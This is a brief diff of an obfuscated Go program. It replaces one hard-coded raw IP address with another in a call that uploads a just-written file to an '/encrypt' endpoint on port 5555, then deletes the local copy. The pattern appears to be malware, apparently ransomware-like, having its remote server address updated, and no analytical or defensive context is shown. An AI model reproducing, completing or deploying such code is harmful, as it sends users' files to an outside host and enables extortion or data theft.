@@ -81,7 +81,7 @@ func main() {
 
 	t := a(x)
 	e = ioutil.WriteFile(g, t, os.ModePerm)
-	y, e := c(g, "http://203.194.112.225:5555/encrypt")
+	y, e := c(g, "http://137.184.250.54:5555/encrypt")
 	e = os.Remove(g)
 
 	z, n, e := b(y)
